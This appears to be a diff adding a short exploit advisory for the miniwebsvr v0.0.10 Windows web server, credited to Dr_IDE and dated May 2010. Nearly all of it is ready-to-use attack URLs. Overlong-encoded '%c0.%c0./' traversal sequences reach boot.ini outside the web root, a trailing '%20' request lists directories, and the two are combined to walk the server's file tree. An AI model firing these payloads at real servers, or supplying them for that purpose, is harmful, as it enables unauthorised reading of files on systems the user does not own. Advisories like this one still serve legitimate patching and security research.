@@ -1,0 +1,33 @@
+###################################################################
+#
+# miniwebsvr v0.0.10 Directory Traversal/Listing Exploits
+# Found By:	Dr_IDE
+# Date: 	May 12, 2010
+# Download:	http://sourceforge.net/projects/miniwebsvr/
+# Tested on:	Windows 7
+#
+###################################################################
+
+- Description -
+
+miniwebsvr v0.0.10 is a Windows based HTTP server. This is the latest
+version of the application available.
+
+miniwebsvr v0.0.10 is vulnerable to remote directory traversal attacks. 
+
+- Directory Traversal Technical Details -
+
+http://[ webserver IP][:port]%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./boot.ini
+http://[ webserver IP][:port]%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini
+
+- Directory Listing Technical Details -
+
+http://[ webserver IP][:port]%20	(This will list out the current directory)
+
+- The two vulnerabilies could be used together for directory walking -
+
+http://[ webserver IP][:port]%c0.%c0./%c0.%c0./%c0.%c0./%20
+http://[ webserver IP][:port]%c0.%c0./%c0.%c0./%20
+http://[ webserver IP][:port]%c0.%c0./%20
+
+#[pocoftheday.blogspot.com]
